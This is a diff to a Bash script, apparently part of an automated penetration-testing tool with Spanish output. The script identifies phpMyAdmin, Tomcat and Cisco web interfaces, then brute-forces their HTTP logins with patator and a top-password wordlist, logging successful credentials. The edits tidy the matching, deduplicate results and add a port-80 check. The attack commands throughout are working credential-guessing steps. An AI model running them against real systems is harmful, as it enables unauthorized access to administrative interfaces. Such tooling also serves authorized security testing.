@@ -109,6 +109,7 @@ then
 			port=`echo $ip_port | cut -d ":" -f 2`
 		
 			result=`webData.pl -t $ip -d "/$path/" -p $port -e todo -l /dev/null -r 4`	
+			result=`echo "$result" | tr '[:upper:]' '[:lower:]'` # a minusculas
 			
 			if [[ $result = *"phpmyadmin"* ]]; then
 				echo -e "\t[+] phpMyAdmin identificado"
@@ -123,7 +124,7 @@ then
 					passWeb_instances=$((`ps aux | grep passWeb | wc -l` - 1)) 
 					if [ "$passWeb_instances" -gt 0 ]
 					then
-						echo -e "\t[i] Todavia hay escaneos de nmap activos ($passWeb_instances)"  
+						echo -e "\t[i] Todavia hay escaneos de passWeb activos ($passWeb_instances)"  
 						sleep 30
 					else
 						break		  		 
@@ -131,10 +132,10 @@ then
 				done
 				##############################
 
-				grep --color=never 'encontrado' logs/cracking/$ip-$port-phpmyadminPassword.txt > .vulnerabilidades/$ip-$port-phpmyadminPassword.txt 
+				grep --color=never 'encontrado' logs/cracking/$ip-$port-phpmyadminPassword.txt | sort | uniq > .vulnerabilidades/$ip-$port-phpmyadminPassword.txt 
 			fi	
 						
-			if [[ $result = *"Tomcat"* ]]; then
+			if [[ $result = *"tomcat"* ]]; then
 				echo -e "\t[+] Tomcat identificado"
 				
 				patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/$ip-$port-passTomcat.txt 2>> logs/cracking/$ip-$port-passTomcat.txt				
@@ -202,11 +203,16 @@ then
 	  
 		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
 		for ip in $(cat .servicios/cisco.txt); do			
-			echo -e "[+] Probando $ip"
-			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/$ip-80-ciscoPassword.txt 2>> logs/cracking/$ip-80-ciscoPassword.txt
-			sleep 2			
-			grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt | tee -a  .vulnerabilidades/$ip-80-ciscoPassword.txt
-			echo ""			
+			egrep -iq "80/open" .nmap_1000p/$ip-tcp.grep
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then			
+				echo -e "[+] Probando $ip"
+				patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/$ip-80-ciscoPassword.txt 2>> logs/cracking/$ip-80-ciscoPassword.txt
+				sleep 2			
+				grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt | tee -a  .vulnerabilidades/$ip-80-ciscoPassword.txt
+				echo ""
+			fi
+						
 		done
 		insert_data
 	 fi	
